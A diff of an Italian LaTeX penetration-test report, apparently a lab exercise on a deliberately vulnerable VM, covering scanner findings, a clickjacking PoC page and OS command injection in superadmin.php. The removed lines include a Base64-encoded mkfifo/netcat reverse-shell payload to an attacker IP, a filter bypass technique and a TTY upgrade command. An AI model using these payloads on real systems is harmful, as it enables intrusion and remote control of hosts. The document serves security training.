-In questa fase, la valutazione terrà conto non solo dell'esistenza della falla, ma della sua reale sfruttabilità nel contesto del laboratorio. Verranno pertanto scartati i vettori d'attacco che richiedono interazioni non simulabili, che violano le regole d'ingaggio (\textit{Rules of Engagement}) o che risultano logicamente inapplicabili in un approccio \textit{Black-Box}.
-
-\subsection{Missing Anti-Clickjacking (UI Redressing PoC)}
-La mancanza degli header \texttt{X-Frame-Options} o \texttt{Content-Security-Policy} sulla pagina \texttt{index.php} è stata validata attraverso la creazione di un \textit{Proof of Concept} (PoC) locale. 
-
-Il team ha sviluppato una pagina HTML malevola per dimostrare come un attaccante possa effettuare un attacco di \textit{UI Redressing}. L'exploit carica l'interfaccia vulnerabile all'interno di un \texttt{iframe} reso quasi trasparente (\texttt{opacity: 0.4}) e lo sovrappone a un pulsante-esca (in questo caso, un finto reindirizzamento al portale \textit{Exploit-DB}). 
-
-\begin{tcolorbox}[colback=white, colframe=headerblue, title=PoC HTML per l'attacco di Clickjacking, fonttitle=\bfseries]
-	\begin{verbatim}
-		<!DOCTYPE html>
-		<html>
-		<head>
-		<title>Clickjacking PoC - Gruppo 11</title>
-		<style>
-		body { position: relative; text-align: center; margin-top: 50px; }
-		.esca { 
-			position: absolute; top: 120px; left: 45%; z-index: 1; 
-			padding: 10px 20px; background-color: red; color: white;
-		}
-		.vulnerabile {
-			position: absolute; top: 0; left: 0; width: 100%; height: 500px;
-			z-index: 2; opacity: 0.4; border: none; /* Trasparente */
-		}
-		</style>
-		</head>
-		<body>
-		<h2>Congratulazioni! Hai vinto un premio.</h2>
-		<a href="https://www.exploit-db.com" class="esca">Clicca qui per ritirarlo!</a>
+	L'albero evidenzia tre pagine accessibili pubblicamente (codice di stato 200 OK), che costituiscono l'intera superficie d'attacco web del target. Le altre risorse mappate sono protette (403 Forbidden) o sono file di sistema Apache (.ht*), non sfruttabili senza un accesso preliminare al sistema.
 		
-		<iframe src="http://192.168.238.7/index.php" class="vulnerabile"></iframe>
-		</body>
-		</html>
-	\end{verbatim}
-\end{tcolorbox}
+\section{Vulnerability Assessment}
+Conclusa l'enumerazione della superficie d'attacco, la fase di \textit{Vulnerability Assessment} si è articolata su due fronti paralleli: l'ispezione manuale delle risorse web identificate, mirata a individuare vulnerabilità logiche e di configurazione, e l'esecuzione di scansioni automatizzate per il rilevamento di \textit{misconfiguration} note. L'esito atteso era una lista di vettori d'attacco potenzialmente sfruttabili per ottenere l'accesso iniziale al sistema (\textit{foothold}).
 
-	Se un utente vittima venisse indotto tramite Ingegneria Sociale a visitare questa pagina e cliccasse sul pulsante rosso per ritirare il premio (o visitare Exploit-DB), il suo click verrebbe in realtà intercettato dal pulsante "Submit" del form di \texttt{index.php} sovrastante. Nonostante il successo del PoC, trattandosi di un form finto senza impatti critici (\textit{Fake Admin Area}), l'exploit non garantisce alcun avanzamento verso l'acquisizione del bersaglio.
+Le scansioni automatizzate sono state condotte con tre strumenti complementari: \texttt{Tenable Nessus} e \texttt{OpenVAS} per la rilevazione di \textit{misconfiguration} a livello di servizio, e \texttt{Nikto} per le verifiche specifiche sul web server (8234 richieste elaborate in 348s). In una fase preliminare è stato testato anche \texttt{OWASP ZAP}, ma i risultati ottenuti sul fronte degli header di sicurezza si sovrapponevano sostanzialmente a quelli di Nikto. ZAP ha intercettato un'evidenza aggiuntiva non rilevata dagli altri tool, un potenziale vettore XSS su attributi HTML controllabili dall'utente, che è stata comunque integrata nella valutazione complessiva del vettore d'attacco principale. Lo strumento è stato tuttavia escluso dalla pipeline di reportistica per una considerazione metodologica: ZAP integra funzionalità di proxy intercettante e di \textit{active scanning} che avrebbero anticipato attività più propriamente collocate nella fase di Target Exploitation, alterando la separazione tra le fasi del FGPT.
 
-\subsection{CUPS Remote Registration (CVE-2024-47176)}
-	L'enumerazione automatizzata ha rivelato la potenziale esposizione della macchina ad una vulnerabilità critica del demone \texttt{cups-browsed} sulla porta UDP 631. Il vettore teorico prevede l'utilizzo del framework \textit{Metasploit} (\texttt{exploit/linux/cups/cups\_ipp\_attributes}) per erigere un server IPP malevolo e forzare il target a registrare una stampante fittizia sotto il controllo dell'attaccante.
+Gli screenshot grezzi delle interfacce dei tool sono omessi a favore di una sintesi analitica. Le scansioni hanno restituito complessivamente \textbf{14 evidenze} distribuite su diverse categorie, dalla configurazione del web server alle vulnerabilità di servizio (CUPS) fino a leak di informazione a livello di rete.
+
+\begin{table}[H]
+	\centering
+	\renewcommand{\arraystretch}{1.3}
+	\begin{tabular}{l c p{7cm}}
+		\toprule
+		\textbf{Vulnerabilità} & \textbf{Tool} & \textbf{Modalità di rilevazione} \\
+		\midrule
+		CUPS Remote Printer Registration & N & Plugin Nessus dedicato (ID 207864), rilevazione attiva su porta UDP 631 \\
+		Web App Vulnerable to Clickjacking & N & Plugin Nessus (ID 85582), assenza di header anti-clickjacking nelle response HTTP \\
+		Missing CSP Header & K & Analisi response HTTP della root del sito \\
+		Apache 2.4.29 Outdated & K & Confronto del banner HTTP con versioni correnti \\
+		Missing Security Headers (4) & K & Verifica di \texttt{Permissions-Policy}, \texttt{X-Content-Type-Options}, \texttt{Strict-Transport-Security}, \texttt{Referrer-Policy} \\
+		Apache Default File Exposed & K & Probe diretto su \texttt{/icons/README} \\
+		Server Version Leak & K & Banner HTTP della response root \\
+		Junk HTTP Methods Accepted & K & Probe con metodi HTTP non standard (possibile false positive) \\
+		TCP Timestamps Disclosure & O & Analisi RFC1323/RFC7323 su pacchetti TCP \\
+		ICMP Timestamp Disclosure & O & ICMP Type 13 (Timestamp Request), risposta Type 14 \\
+		\bottomrule
+	\end{tabular}
+	\caption{Categorie di vulnerabilità emerse dalle scansioni automatizzate e modalità di rilevazione. Legenda tool: N = Nessus, K = Nikto, O = OpenVAS.}
+	\label{tab:automated_scans}
+\end{table}
+
+La distribuzione delle evidenze tra i diversi tool, riassunta nella matrice di figura~\ref{fig:vuln_matrix}, evidenzia il grado di sovrapposizione tra gli scanner utilizzati e le aree di rilevamento esclusive di ciascuno.
+
+\begin{figure}[H]
+	\centering
+	\begin{tikzpicture}[
+		every node/.style={font=\footnotesize},
+		cell/.style={minimum width=1.2cm, minimum height=0.7cm, anchor=center},
+		catbox/.style={text width=4.5cm, align=left, anchor=east},
+		toolhead/.style={font=\footnotesize\bfseries, text width=1.4cm, align=center}
+		]
+		% Intestazioni colonne (tool)
+		\node[toolhead] at (5.5, 0.5) {Nessus};
+		\node[toolhead] at (7.0, 0.5) {OpenVAS};
+		\node[toolhead] at (8.5, 0.5) {Nikto};
+		\node[toolhead] at (10.0, 0.5) {OWASP\\ZAP};
+		
+		% Linea di separazione header
+		\draw[thick] (0, 0.05) -- (10.7, 0.05);
+		
+		% Categoria 1: Missing Security Headers
+		\node[catbox] at (4.5, -0.5) {Missing Security Headers};
+		\node[cell, fill=Orange!30] at (5.5, -0.5) {\checkmark};
+		\node[cell] at (7.0, -0.5) {--};
+		\node[cell, fill=Orange!30] at (8.5, -0.5) {\checkmark};
+		\node[cell, fill=Orange!30] at (10.0, -0.5) {\checkmark};
+		
+		% Categoria 2: CUPS RCE
+		\node[catbox] at (4.5, -1.2) {CUPS RCE (CVE-2024-47176)};
+		\node[cell, fill=red!30] at (5.5, -1.2) {\checkmark};
+		\node[cell] at (7.0, -1.2) {--};
+		\node[cell] at (8.5, -1.2) {--};
+		\node[cell] at (10.0, -1.2) {--};
+		
+		% Categoria 3: Server Version Disclosure
+		\node[catbox] at (4.5, -1.9) {Server Version Disclosure};
+		\node[cell] at (5.5, -1.9) {--};
+		\node[cell] at (7.0, -1.9) {--};
+		\node[cell, fill=ForestGreen!30] at (8.5, -1.9) {\checkmark};
+		\node[cell, fill=ForestGreen!30] at (10.0, -1.9) {\checkmark};
+		
+		% Categoria 4: Apache Outdated
+		\node[catbox] at (4.5, -2.6) {Apache Version Outdated};
+		\node[cell] at (5.5, -2.6) {--};
+		\node[cell] at (7.0, -2.6) {--};
+		\node[cell, fill=ForestGreen!30] at (8.5, -2.6) {\checkmark};
+		\node[cell] at (10.0, -2.6) {--};
+		
+		% Categoria 5: Default Files
+		\node[catbox] at (4.5, -3.3) {Apache Default Files Exposed};
+		\node[cell] at (5.5, -3.3) {--};
+		\node[cell] at (7.0, -3.3) {--};
+		\node[cell, fill=ForestGreen!30] at (8.5, -3.3) {\checkmark};
+		\node[cell] at (10.0, -3.3) {--};
+		
+		% Categoria 6: Timestamps Information Disclosure
+		\node[catbox] at (4.5, -4.0) {Timestamps Info Disclosure};
+		\node[cell] at (5.5, -4.0) {--};
+		\node[cell, fill=ForestGreen!30] at (7.0, -4.0) {\checkmark};
+		\node[cell] at (8.5, -4.0) {--};
+		\node[cell] at (10.0, -4.0) {--};
+		
+		% Categoria 7: Potential XSS
+		\node[catbox] at (4.5, -4.7) {Potential XSS (HTML attribute)};
+		\node[cell] at (5.5, -4.7) {--};
+		\node[cell] at (7.0, -4.7) {--};
+		\node[cell] at (8.5, -4.7) {--};
+		\node[cell, fill=Orange!30] at (10.0, -4.7) {\checkmark};
+		
+	\node[cell, fill=red!30] at (0.4, -6.3) {};
+	\node[anchor=west] at (1.0, -6.3) {\footnotesize High};
 	
-	Tuttavia, dopo un'attenta analisi della \textit{Kill-Chain} associata a questa specifica CVE, il team ha stabilito l'impossibilità di procedere con l'Exploitation attiva. Affinché il payload malevolo (il comando RCE) venga effettivamente innescato e garantisca una \textit{Reverse Shell}, è strettamente necessaria l'interazione di un utente locale valido che avvii un processo di stampa (\textit{print job}) verso la stampante compromessa.
+	\node[cell, fill=Orange!30] at (2.5, -6.3) {};
+	\node[anchor=west] at (3.1, -6.3) {\footnotesize Medium};
 	
-	Operando in un ambiente di laboratorio isolato, privo di traffico generato da utenti simulati e attenendosi rigorosamente a un approccio \textit{Black-Box} (che vieta l'accesso prematuro al sistema tramite credenziali non ancora compromesse), la catena di esecuzione si interrompe prima del trigger finale. La vulnerabilità è pertanto confermata architetturalmente, ma classificata come \textbf{non sfruttabile} nel presente scenario operativo.
+	\node[cell, fill=ForestGreen!30] at (5.0, -6.3) {};
+	\node[anchor=west] at (5.6, -6.3) {\footnotesize Low};
+		
+	\end{tikzpicture}
+	\caption{Matrice di cross-validation tra i tool di Vulnerability Assessment. Ogni riga rappresenta una categoria di vulnerabilità rilevata; le celle colorate indicano quali tool hanno identificato la stessa famiglia di problemi.}
+	\label{fig:vuln_matrix}
+\end{figure}
+
+Nelle sottosezioni seguenti si approfondiscono le evidenze raggruppate per categoria di vulnerabilità.
+
+\subsection{Information Disclosure e Steganografia (\texttt{/admin})}
+L'ispezione manuale è partita dalla pagina \texttt{/admin}. L'analisi del codice sorgente HTML ha rivelato una vulnerabilità di tipo \textit{Information Disclosure}: all'interno dei tag di commento del markup è presente in chiaro la stringa \texttt{passphrase:harder}.
+
+\begin{figure}[H]
+	\centering
+	\begin{minipage}{0.48\textwidth}
+		\centering
+		\includegraphics[width=\linewidth]{assets/academy_photo/vulnerabilityAssessment/admin.png}
+		\caption{La pagina \texttt{admin} e il form ispezionato.}
+		\label{fig:admin_html}
+	\end{minipage}\hfill
+	\begin{minipage}{0.48\textwidth}
+		\centering
+		\includegraphics[width=\linewidth]{assets/academy_photo/vulnerabilityAssessment/admin_code.png}
+		\caption{Codice HTML con la passphrase in chiaro.}
+		\label{fig:admin_code_html}
+	\end{minipage}
+\end{figure}
+
+Considerato il contesto (immagini esposte nella stessa directory), l'ipotesi più immediata era che la passphrase servisse a estrarre un payload steganografico. Le immagini sono state scaricate localmente e analizzate con \texttt{steghide}: la combinazione con la passphrase recuperata ha effettivamente restituito un file di testo nascosto all'interno di \texttt{haclabs.jpeg}.
+
+Il file \texttt{imp.txt} conteneva la stringa \texttt{c3VwZXJhZG1pbi5waHA=}. Il padding terminale \texttt{=} è una firma riconoscibile della codifica Base64: la decodifica ha restituito il nome \texttt{superadmin.php}, ovvero la stessa pagina già identificata da gobuster nella fase di Target Enumeration.
+
+\begin{figure}[H]
+	\centering
+	\includegraphics[width=0.7\textwidth]{assets/academy_photo/vulnerabilityAssessment/admin_steganography_cut.png}
+	\caption{Fase di estrazione e decodifica steganografica del payload dalle immagini.}
+	\label{fig:steganography_extract}
+\end{figure}
+
+Il fatto che \texttt{superadmin.php} sia esplicitamente segnalata da un payload steganografico, e quindi \textit{intenzionalmente} da chi ha progettato la macchina, conferma l'ipotesi che si tratti del vettore d'attacco principale dell'attività.
+
+\subsection{Web Security Misconfigurations}
+Le scansioni automatizzate hanno rilevato sul web server una serie di \textit{misconfiguration} ricorrenti, già classificate nella tabella~\ref{tab:automated_scans}. La maggior parte delle evidenze ricade nella famiglia degli \textbf{header di sicurezza HTTP mancanti o non configurati}: \texttt{X-Frame-Options} (la cui assenza espone al \textit{Clickjacking}), \texttt{Content-Security-Policy}, \texttt{Strict-Transport-Security}, \texttt{Permissions-Policy}, \texttt{X-Content-Type-Options} e \texttt{Referrer-Policy}.
+
+A queste si affiancano alcune \textit{Information Disclosure} di livello \textit{Low}: il banner HTTP che espone esplicitamente la versione \texttt{Apache/2.4.29 (Ubuntu)}, l'accessibilità del file di default \texttt{/icons/README}, e il fatto che la versione di Apache risulti significativamente obsoleta rispetto alle release correnti. Tali evidenze, isolatamente di basso impatto, contribuiscono nel complesso a facilitare la profilazione del target da parte di un attaccante.
+
+OWASP ZAP ha inoltre segnalato un potenziale vettore XSS legato ad attributi HTML controllabili dall'utente. Questa evidenza è stata mantenuta in considerazione nella fase di scelta del vettore d'attacco principale, in cui è stato valutato il comportamento dei form esposti.
+
+La verifica empirica dell'effettiva sfruttabilità della mancanza di header anti-clickjacking è descritta nella sezione \textit{Target Exploitation}.
+
+\subsection{Analisi Servizio di Stampa (CUPS su porta 631)}
+Le scansioni hanno inoltre rilevato l'esposizione del demone \texttt{cups-browsed}, il componente del sistema di stampa Linux che gestisce la scoperta automatica delle stampanti di rete. Questo demone è stato recentemente oggetto della catena di vulnerabilità CVE-2024-47176 e correlate (CVSS 5.3, Severity Medium/High), che in determinate condizioni può portare a \textit{Remote Code Execution} tramite la registrazione di stampanti malevole sulla rete.
+
+Trattandosi di una vulnerabilità critica e relativamente recente, è stata catalogata per un'eventuale verifica empirica nella fase di Target Exploitation. La valutazione della reale sfruttabilità nel contesto dell'attività è discussa nella sezione corrispondente.
+
+\subsection{Identificazione Vettore d'Attacco Principale (\texttt{/superadmin.php})}
+L'analisi è poi passata all'esame della logica applicativa delle interfacce identificate. La pagina principale (\texttt{index.php}), denominata \textit{Fake Admin Area}, espone un form che imita una diagnostica di rete: qualunque input venga inserito, la risposta è la stringa statica ``\textit{Fake ping executed}'', senza alcuna interazione effettiva con il sistema.
+
+\begin{figure}[H]
+	\centering
+	\includegraphics[width=0.8\textwidth]{assets/academy_photo/vulnerabilityAssessment/index_php_fake_ping.png}
+	\caption{Interfaccia \texttt{index.php} (\textit{Fake Admin Area}) con risposta predefinita all'input utente.}
+	\label{fig:fake_admin_area}
+\end{figure}	
+
+L'interfaccia nascosta \textbf{\texttt{superadmin.php}}, al contrario, invoca un'esecuzione effettiva del comando \texttt{ping} verso l'indirizzo IP fornito dall'utente. I moduli web che inoltrano input dell'utente a funzioni di sistema senza un'adeguata sanitizzazione costituiscono uno dei vettori classici per le vulnerabilità di tipo \textbf{OS Command Injection}~\cite{cwe78}.
+
+I primi test in modalità \textit{Black-Box} — tentativi di concatenazione di comandi tramite operatori come \texttt{\&\&} e \texttt{;} — hanno restituito esclusivamente pagine vuote, comportamento che lascia intuire la presenza di un filtro lato server, probabilmente una \textit{blacklist} di caratteri speciali.
+
+\begin{figure}[H]
+	\centering
+	\begin{minipage}{0.48\textwidth}
+		\centering
+		\includegraphics[width=\linewidth]{assets/academy_photo/vulnerabilityAssessment/superadmin_first_try.png}
+		\caption{Tentativo fallito di concatenazione con l'operatore AND logico (\texttt{\&\&}).}
+		\label{fig:injection_fail_1}
+	\end{minipage}\hfill
+	\begin{minipage}{0.48\textwidth}
+		\centering
+		\includegraphics[width=\linewidth]{assets/academy_photo/vulnerabilityAssessment/superadmin_second_try.png}
+		\caption{Tentativo fallito di esecuzione sequenziale con terminatore (\texttt{;}).}
+		\label{fig:injection_fail_2}
+	\end{minipage}
+\end{figure}
+
+Il \textit{bypass} del filtro e lo sfruttamento effettivo di questa vulnerabilità sono descritti nella sezione \textit{Target Exploitation}.
+	\section{Target Exploitation}
+	La fase di \textit{Target Exploitation} verifica empiricamente quali tra le vulnerabilità individuate nel Vulnerability Assessment risultano effettivamente sfruttabili per ottenere il controllo della macchina o per estrarne dati sensibili. 
+	Non basta che una falla esista: occorre che le condizioni operative dell'ambiente ne permettano la concreta sfruttabilità. Sono stati di conseguenza scartati i vettori d'attacco che richiederebbero interazioni non simulabili nell'ambiente isolato, che violerebbero le \textit{Rules of Engagement} definite nel Target Scoping o che risultano logciamente inapplicabili in un approccio \textit{Black-Box}.
 	
-\subsection{Web Remote Code Execution (\texttt{/superadmin.php})}
-A seguito dell'esito negativo dei precedenti tentativi di iniezione, è stata ipotizzata la presenza di un meccanismo di sanitizzazione dell'input basato su \textit{blacklist}. Per validare tale ipotesi e mappare i confini del filtro, il team ha condotto ulteriori test di \textit{fuzzing} manuale. 
+	
+	\subsection{Missing Anti-Clickjacking (UI Redressing PoC)}
+	L'assenza degli header \texttt{X-Frame-Options} e \texttt{Content-Security-Policy} con direttiva \texttt{frame-ancestors} sulla pagina \texttt{index.php} è stata verificata tramite un \textit{Proof of Concept} (PoC) locale.
+	È stata sviluppata una pagina HTML di test che riproduce il principio di un attacco di \textit{UI Redressing}: l'interfaccia bersaglio viene caricata all'interno di un \texttt{iframe} con opacità ridotta (\texttt{opacity: 0.4}) e sovrapposta a un pulsante-esca, nel caso specifico un finto link al portale \textit{Exploit-DB}.
+	
+	\begin{tcolorbox}[colback=white, colframe=headerblue, title=PoC HTML per l'attacco di Clickjacking, fonttitle=\bfseries]
+		\begin{verbatim}
+			<!DOCTYPE html>
+			<html>
+			<head>
+			<title>Clickjacking PoC - Gruppo 11</title>
+			<style>
+			body { position: relative; text-align: center; margin-top: 50px; }
+			.esca { 
+				position: absolute; top: 120px; left: 45%; z-index: 1; 
+				padding: 10px 20px; background-color: red; color: white;
+			}
+			.vulnerabile {
+				position: absolute; top: 0; left: 0; width: 100%; height: 500px;
+				z-index: 2; opacity: 0.4; border: none; /* Trasparente */
+			}
+			</style>
+			</head>
+			<body>
+			<h2>Congratulazioni! Hai vinto un premio.</h2>
+			<a href="https://www.exploit-db.com" class="esca">Clicca qui per ritirarlo!</a>
+			
+			<iframe src="http://192.168.238.7/index.php" class="vulnerabile"></iframe>
+			</body>
+			</html>
+		\end{verbatim}
+	\end{tcolorbox}
+		
+	Nel funzionamento teorico dell'attacco, un utente attratto sulla pagina e indotto a cliccare sul pulsante-esca attiverebbe in realtà il pulsante ``Submit'' del form di \texttt{index.php} sottostante. La dimostrazione conferma la vulnerabilità del web server al \textit{UI Redressing}, ma , trattandosi di un form privo di logica applicativa reale (la già citata \textit{Fake Admin Area}) , il vettore non offre alcun avanzamento concreto verso la compromissione del bersaglio. Si segnala inoltre che lo sfruttamento richiederebbe tecniche di Ingegneria Sociale per veicolare la vittima sulla pagina, attività esplicitamente esclusa dal perimetro delle \textit{Rules of Engagement} (cfr. sezione Target Scoping).
+		
+	\subsection{CUPS Remote Registration (CVE-2024-47176)}
+	A partire dall'evidenza riportata dagli scanner (cfr. tabella~\ref{tab:automated_scans}) Il vettore di sfruttamento previsto prevede l'utilizzo del framework \textit{Metasploit} (\texttt{exploit/linux/cups/cups\_ipp\_attributes}) che istanzia un server IPP malevolo  sulla macchina atttacante e induce il target a registrare una stampante fittizia sotto il controllo dell'attaccante.
+	
+	Il modulo è stato caricato e configurato all'interno del framework Metaspoloit, ma l'esecuzione non ha prodotto risultati utili ai fini dell'ingaggio. La ragione è strutturale e non aggirabile  nel contesto dell'attività.
+	La catena di compromissione CVE-2024-47176 richiede, come trigger finale, che un utente locale del sistema target avvii un \textit{print job} verso la stampante registrata. Solo questo evento causa effettivamente l'esecuzione del comando malevolo infettato dal modulo.
+	
+	Operando in un ambiente di laboratorio isolato, privo di traffico generato da utenti simulati e attenendosi rigorosamente a un approccio \textit{Black-Box} (che vieta l'accesso prematuro al sistema tramite credenziali non ancora compromesse), la catena di esecuzione si interrompe prima del trigger finale. La vulnerabilità è pertanto confermata architetturalmente, ma classificata come \textbf{non sfruttabile} nel presente scenario operativo, ed è stata documentata come tale.
+	
+	\subsection{Web Remote Code Execution (\texttt{/superadmin.php})}
+	Il fallimento dei testi iniziali con \texttt{\&\&} e \texttt{;} suggerisce la presenza di un filtro lato server basato su blacklist. Per individuarne i confini è stato condotto un  \textit{fuzzing} manuale di metacaratteri shell alternativi.
+	
+	L'utilizzo del metacarattere \textit{pipe} (\texttt{|}) tramite il payload \texttt{192.168.238.4 | cat superadmin.php} ha permesso di eludere il filtraggio. L'applicazione ha elaborato inaspettatamente la richiesta, restituendo in chiaro il codice sorgente PHP della pagina. L'attività di \textit{Code Review} ha immediatamente evidenziato due problemi:
+	
+	\begin{figure}[H]
+		\centering
+		\includegraphics[width=0.85\textwidth]{assets/academy_photo/vulnerabilityAssessment/superadmin_php_inspection.png}
+		\caption{Estrazione del codice sorgente PHP grazie all'elusione del filtro tramite l'operatore pipe.}
+		\label{fig:superadmin_php_review}
+	\end{figure}
+	
+	\begin{enumerate}[label=\textcolor{headerblue}{\textbf{\arabic*.}}, leftmargin=*]
+		\item \textbf{Blacklist incompleta:} Il controllo dell'input è affidato alla funzione \texttt{str\_replace()}, che rimuove le occorrenze presenti nell'array \texttt{\$word}. Essendo un approccio limitato, omette metacaratteri fondamentali di concatenazione (come \texttt{|}). Inoltre, la blacklist include termini specifici come \texttt{bin} e \texttt{nc}, sufficienti a impedire la chiamata diretta ai binari di shell o agli strumenti di rete come Netcat, ostacolando l'apertura immediata di una \textit{Reverse Shell}, ma non prevenendo l'esecuzione di comandi alternativi equivalenti ottenibili per altre vie.
+		\item \textbf{Chiamata diretta a \texttt{shell\_exec}:} Dopo il filtraggio, l'input utente viene concatenato direttamente nella stringa passata  \texttt{shell\_exec("ping -c 3 \$pinged")}, senza alcuna sanitizzazione strutturale. Di conseguenza, qualsiasi blocco di istruzioni iniettato successivamente alla direttiva \texttt{ping}, purché accettato dal filtro, viene eseguito arbitrariamente dal sistema operativo nel contesto del processo Apache.
+	\end{enumerate}
+	
+	Bloccata l'invocazionei diretta di \texttt{Netcat} a causa del filtro imposto sull'eseguibile (\texttt{nc}) e sugli spazi, Il bypass è stato costruito combinando due tecniche shell standard: la \textbf{Command Substitution} tramite \textit{backticks} (`...`) e la codifica in \textbf{Base64} del payload effettivo. 
+	L'idea è semplice: la blacklist confronta l'input con un insieme finito di stringhe vietate, quindi un comando codificato in Base64 non viene riconosciuto.\\
+	Una volta inietttato, è la shell stessa a decodificare il blocco e ad eseguirlo, tramite il pattern \texttt{`echo "..." | base64 -d`} racchiuso nel backticks. Il payload Base64 è stato generato sulla macchina attaccante:
 
-L'utilizzo del metacarattere \textit{pipe} (\texttt{|}) tramite il payload \texttt{192.168.238.4 | cat superadmin.php} ha permesso di eludere le difese del modulo. L'applicazione ha elaborato inaspettatamente la richiesta, restituendo in chiaro il codice sorgente PHP della pagina. L'attività di \textit{Code Review} ha immediatamente evidenziato due criticità architetturali di livello severo:
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.85\textwidth]{assets/academy_photo/vulnerabilityAssessment/superadmin_php_inspection.png}
-	\caption{Estrazione del codice sorgente PHP grazie all'elusione del filtro tramite l'operatore pipe.}
-	\label{fig:superadmin_php_review}
-\end{figure}
-
-\begin{enumerate}[label=\textcolor{headerblue}{\textbf{\arabic*.}}, leftmargin=*]
-	\item \textbf{Blacklist Inefficiente e Incompleta:} Il controllo dell'input è affidato alla funzione \texttt{str\_replace()}, che tenta di inibire i comandi vietando le occorrenze presenti nell'array \texttt{\$word}. Essendo un approccio limitato, omette metacaratteri fondamentali di concatenazione (come \texttt{|}). Inoltre, la censura di termini specifici come \texttt{bin} e \texttt{nc} impedisce la chiamata diretta ai binari di shell o agli strumenti di rete, ostacolando l'apertura immediata di una \textit{Reverse Shell}, ma non prevenendo l'esecuzione di comandi alternativi.
-	\item \textbf{Insecure System Call (OS Command Injection):} Effettuata la blanda operazione di filtraggio, l'input utente viene concatenato alla variabile e passato senza alcuna sterilizzazione alla pericolosa funzione \texttt{shell\_exec("ping -c 3 \$pinged")}. Di conseguenza, qualsiasi blocco di istruzioni iniettato successivamente alla direttiva \texttt{ping} e accettato dal filtro, viene eseguito arbitrariamente dal sistema operativo.
-\end{enumerate}
-
-Appurata l'impossibilità di invocare direttamente \texttt{Netcat} a causa del filtro imposto sull'eseguibile (\texttt{nc}) e sugli spazi, il team ha ingegnerizzato un payload mirato per aggirare le restrizioni della \textit{blacklist}. La tecnica prescelta sfrutta la \textbf{Command Substitution} di Linux tramite l'uso dei \textit{backticks} (\texttt{`...`}) e l'impiego della codifica in \textbf{Base64}. 
-
-Codificando preventivamente il comando malevolo, l'array di controllo del server non è in grado di riconoscere e bloccare le stringhe vietate. Una volta iniettato, il sistema decodificherà il blocco al volo e lo eseguirà prioritariamente. Si è proceduto quindi a generare il payload in Base64 sulla macchina attaccante:
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.85\textwidth]{assets/academy_photo/exploitation/netcat_base64.png}
-	\caption{Codifica in Base64 del comando di Reverse Shell tramite Netcat.}
-	\label{fig:netcat_base64}
-\end{figure}
-
-Parallelamente, è stato predisposto un \textit{listener} TCP sulla macchina attaccante (\texttt{Kali Linux}) in ascolto sulla porta 2222:
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.85\textwidth]{assets/academy_photo/exploitation/netcat_kali_before_conn.png}
-	\caption{Configurazione del listener Netcat in attesa della connessione in ingresso.}
-	\label{fig:netcat_kali}
-\end{figure}
-
-Preparato l'ambiente operativo, il payload finale di \textit{Remote Code Execution} iniettato all'interno del form web di \texttt{superadmin.php} è risultato essere il seguente:
-
-\begin{tcolorbox}[colback=gray!10, colframe=black!70, title=Payload RCE con bypass in Base64]
-	\texttt{192.168.238.4 | `echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnx8L2Jpbi9zaCAtaSAyPiYxfHxuYyAxOTIuMTY4LjIzOC40IDIyMjIgPi90bXAvZg==" | base64 -d`}
-\end{tcolorbox}
-
-\textbf{Esito dell'attacco:}
-L'invio del modulo ha generato un'attesa prolungata della pagina web, sintomo di una chiamata di sistema bloccante. Istantaneamente, sul terminale dell'attaccante si è registrata la ricezione della connessione di ritorno (\textit{call-back}), confermando l'apertura di una \textbf{Reverse Shell} sul bersaglio e garantendo l'accesso interattivo all'infrastruttura.
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.85\textwidth]{assets/academy_photo/exploitation/netcat_to_noname.png}
-	\caption{Ricezione della Reverse Shell sul terminale dell'attaccante.}
-	\label{fig:netcat_succeded}
-\end{figure}
-
-La shell iniziale, essendo un processo \textit{non-TTY} instabile e privo di autocompletamento, è stata immediatamente sottoposta a un'operazione di \textit{TTY Upgrading} avvalendosi dell'interprete \texttt{Python} integrato nel sistema ospite (\texttt{python -c 'import pty; pty.spawn("/bin/bash")'}). 
-
-A seguire, l'enumerazione del contesto di sicurezza ha confermato che l'accesso iniziale (\textit{foothold}) è avvenuto con i privilegi limitati associati all'account di servizio \texttt{www-data}.
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.85\textwidth]{assets/academy_photo/exploitation/exploit_part_one_spawn_shell.png}
-	\caption{Upgrading della shell in TTY interattiva e verifica dell'identità utente (whoami).}
-	\label{fig:reverse_shell}
-\end{figure}
-
-L'utente \texttt{www-data}, predefinito per il demone Apache, opera in un perimetro di restrizione senza diritti di amministrazione. Tuttavia, esplorando la directory di base degli utenti (\texttt{/home}), il team ha rilevato la presenza di due profili locali: \textbf{\texttt{yash}} e \textbf{\texttt{haclabs}}. All'interno della home directory di \texttt{yash}, è stato individuato e letto il file \texttt{flag1.txt}, il cui contenuto si è rivelato propedeutico e indispensabile per la successiva fase di espansione dei privilegi.
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=0.85\textwidth]{assets/academy_photo/exploitation/exploit_part_one_flag1.png}
-	\caption{Identificazione delle home utente e acquisizione del contenuto del file flag1.txt.}
-	\label{fig:first_flag}
-\end{figure}
-\section{Privilege Escalation}
-Ottenuto l'accesso iniziale al sistema tramite la \textit{Reverse Shell}, il contesto di esecuzione corrispondeva all'account \texttt{www-data}. Essendo quest'ultimo sprovvisto di privilegi amministrativi, l'attività di \textit{Privilege Escalation} è stata suddivisa in due fasi: uno spostamento orizzontale (User Pivoting) e un'escalation verticale definitiva (Rooting).
-
-\subsection{User Pivoting (da www-data a haclabs)}
-L'enumerazione locale partendo dalla directory \texttt{/home} ha permesso di rinvenire un primo file di testo (\texttt{flag1.txt}) contenente un indizio cruciale per il reperimento delle credenziali dell'utente \texttt{haclabs}. Seguendo le tracce lasciate nel sistema, è stato utilizzato il comando \texttt{find} per individuare tutti i file nascosti di proprietà dell'utente \texttt{yash}.
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=\textwidth]{assets/academy_photo/exploitation/exploit_part_one_haclab_psw.png}
-	\caption{Ricerca mirata dei file di configurazione appartenenti all'utente yash.}
-	\label{fig:haclab_psw}
-\end{figure}
-
